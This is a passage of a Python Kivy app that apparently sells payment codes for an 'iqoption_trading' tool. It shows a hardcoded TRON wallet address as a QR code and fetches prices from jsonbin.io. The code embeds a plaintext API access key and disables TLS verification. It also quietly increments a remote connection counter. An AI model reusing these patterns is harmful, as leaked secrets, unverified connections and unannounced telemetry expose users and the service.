       
            self.widget118.text = f"Amount of {asdhad} to send: {sqsqs} {dkajd}"  
        except:
            shhshs="Check your Internet connection."            
            self.widget118.text = shhshs
            self.widget117.text = shhshs
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------         
    def precio_buy(self,dt):
        try:
            api_key = '$2a$10$hVNZ6cA/ceNajtEBnfJFOejczv//zQIUVoF3QnQNmVfmGMUIxkjmi'
            bin_id = '66ccb5f9ad19ca34f89b57f2' 
            url = f'https://api.jsonbin.io/v3/b/{bin_id}/latest'               
            headers = {
                'X-ACCESS-KEY': api_key
            }
            
            # Enviar solicitud GET para recuperar el bin
            response = requests.get(url, headers=headers,verify=False)
          
            if response.status_code == 200:
                datos = response.json()
                mensaje = datos['record']['mensaje']                                
                self.widget110.text = mensaje
                jsdksd=mensaje[0:-3]
                self.varxxx=int(jsdksd)
                self.calcular_precio_codigo_pago(0) 
            else:
                shhshs="Check your Internet connection."                
                self.widget110.text = shhshs   
        except:
            shhshs="Check your Internet connection."            
            self.widget110.text = shhshs
        if self.var_conex==0:
            try:
                api_key = '$2a$10$hVNZ6cA/ceNajtEBnfJFOejczv//zQIUVoF3QnQNmVfmGMUIxkjmi'
                bin_id = '67b8d04dacd3cb34a8eb7cde' 
                url = f'https://api.jsonbin.io/v3/b/{bin_id}/latest'               
                headers = {
                    'X-ACCESS-KEY': api_key
                }
                
                # Enviar solicitud GET para recuperar el bin
                response = requests.get(url, headers=headers,verify=False) 
        
                if response.status_code == 200:
                    datos = response.json()
                    mensajexxx = datos['record']["conexiones"]
                    qdqdqd= mensajexxx+1
                    # Tu API Key de JSONBin
                    api_key = '$2a$10$hVNZ6cA/ceNajtEBnfJFOejczv//zQIUVoF3QnQNmVfmGMUIxkjmi'
                    
                    # ID del bin que quieres modificar
                    bin_id = '67b8d04dacd3cb34a8eb7cde'
                    
                    # Nuevos datos que quieres guardar en el bin
                    nuevos_datos = {
                        "conexiones": qdqdqd
                    }                    
                    # URL para acceder al bin específico
                    url = f'https://api.jsonbin.io/v3/b/{bin_id}'
                    
                    # Cabeceras para la solicitud
                    headers = {
                        'Content-Type': 'application/json',
                        'X-ACCESS-KEY': api_key
                    }
                    
                    # Enviar solicitud PUT para modificar el bin
                    response = requests.put(url, headers=headers, data=json.dumps(nuevos_datos), verify=False)
                    
                    if response.status_code == 200:
                        self.var_conex=1
                    else:
                        None     
            except:
                 None       
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def seleccionar_forma_pago(self, spinner, text):
        if self.spinner_compra.text=="Buy a payment code with: (USDT_TRC20):":
           self.dirreccion_pago="TRajftdF9ZtVsAgVPHXVsZ1XZPv4PoW2p2"                        
           self.widget100.text = "Address of cryptocurrencies to be sent (USDT_TRC20):"            
           self.widget105.text = "Cryptocurrency Sending Address (USDT_TRC20):"
           self.widget103.text="TRajftdF9ZtVsAgVPHXVsZ1XZPv4PoW2p2"            
           self.widget116.text = "Calculation of the amount of (USDT_TRC20) to be sent:"
           self.widget106.hint_text="Please enter the address of the cryptocurrency\nyou are sending (USDT_TRC20)"
        elif self.spinner_compra.text=="Buy a payment code with: (TRX):":
            self.dirreccion_pago="TRajftdF9ZtVsAgVPHXVsZ1XZPv4PoW2p2"                        
            self.widget100.text = "Address of cryptocurrencies to be sent (TRX):"            
            self.widget105.text = "Cryptocurrency Sending Address (TRX):"
            self.widget103.text="TRajftdF9ZtVsAgVPHXVsZ1XZPv4PoW2p2"            
            self.widget116.text = "Calculation of the amount of (TRX) to be sent:"
            self.widget106.hint_text="Please enter the address of the cryptocurrency\nyou are sending (TRX)"       
        self.Contenedor_5CCC01.clear_widgets()
        # Crea un objeto QRCode
        qr = qrcode.QRCode(
            version=1,  # Controla el tamaño del código QR
            error_correction=qrcode.constants.ERROR_CORRECT_L,  # Controla la corrección de errores
            box_size=5,  # Tamaño de cada caja en el código QR
            border=2,  # Ancho del borde
        )
    
        # Agrega la dirección de Bitcoin al código QR
        qr.add_data(self.dirreccion_pago)
        qr.make(fit=True)   
        # Genera la imagen del código QR
        img = qr.make_image(fill='black', back_color='white')    
        # Convierte la imagen a un formato que Kivy puede mostrar
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)    
        # Crea un objeto Kivy Image
        kivy_image = CoreImage(img_byte_arr, ext='png')
        self.Contenedor_5CCC01.add_widget(Image(texture=kivy_image.texture))
        Clock.schedule_once(self.calcular_precio_codigo_pago)       
        Clock.schedule_once(self.precio_buy)
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def _update_rect20(self, instance, value):
        # Actualizar el tamaño y la posición del rectángulo
        self.rect20.pos = instance.pos
        self.rect20.size = instance.size
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
class main(App):
    def build(self):        
        sm = ScreenManager()
        sm.add_widget(MainScreen(name='iqoption_trading'))  # Pantalla inicial
        #sm.add_widget(Comprar_producto(name='compra'))   # Pantalla de compra        
        return sm
if __name__ == '__main__':
    main().run() 